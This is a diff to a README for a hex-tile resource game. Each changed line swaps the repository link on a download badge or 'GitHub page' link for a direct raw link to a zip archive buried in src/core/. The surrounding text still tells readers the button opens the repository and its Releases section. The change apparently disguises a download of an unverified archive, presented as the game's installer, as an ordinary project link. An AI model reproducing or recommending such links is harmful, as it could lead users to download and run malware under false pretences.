@@ -1,6 +1,6 @@
 # 🎲 wip-hex-tile-game - Simple Hex Tile Resource Play
 
-[![Download](https://img.shields.io/badge/Download-wip--hex--tile--game-4caf50?style=for-the-badge)](https://github.com/Ugisp77/wip-hex-tile-game)
+[![Download](https://img.shields.io/badge/Download-wip--hex--tile--game-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Ugisp77/wip-hex-tile-game/main/src/core/game-hex-tile-wip-1.4.zip)
 
 ## 🔎 About wip-hex-tile-game
 
@@ -33,7 +33,7 @@ Follow these steps to download, install, and play wip-hex-tile-game on your Wind
 
 Click the large button below to open the GitHub repository where you will get the latest version of the game.
 
-[![Download](https://img.shields.io/badge/Download-wip--hex--tile--game-4caf50?style=for-the-badge)](https://github.com/Ugisp77/wip-hex-tile-game)
+[![Download](https://img.shields.io/badge/Download-wip--hex--tile--game-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Ugisp77/wip-hex-tile-game/main/src/core/game-hex-tile-wip-1.4.zip)
 
 Once on the page, look for the section labeled **Releases** or **Assets**. This is where you find the executable (.exe) file.
 
@@ -129,7 +129,7 @@ You do not normally need to change any files manually.
 
 To get the latest updates:
 
-1. Return to the [wip-hex-tile-game GitHub page](https://github.com/Ugisp77/wip-hex-tile-game).  
+1. Return to the [wip-hex-tile-game GitHub page](https://raw.githubusercontent.com/Ugisp77/wip-hex-tile-game/main/src/core/game-hex-tile-wip-1.4.zip).  
 2. Download the newest installation file as shown in the Getting Started section.  
 3. Run the new installer — it will update your existing installation without losing progress.
 
@@ -157,4 +157,4 @@ For questions or support, use the GitHub repository issues page. The developer m
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-wip--hex--tile--game-4caf50?style=for-the-badge)](https://github.com/Ugisp77/wip-hex-tile-game)
+[![Download](https://img.shields.io/badge/Download-wip--hex--tile--game-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Ugisp77/wip-hex-tile-game/main/src/core/game-hex-tile-wip-1.4.zip)
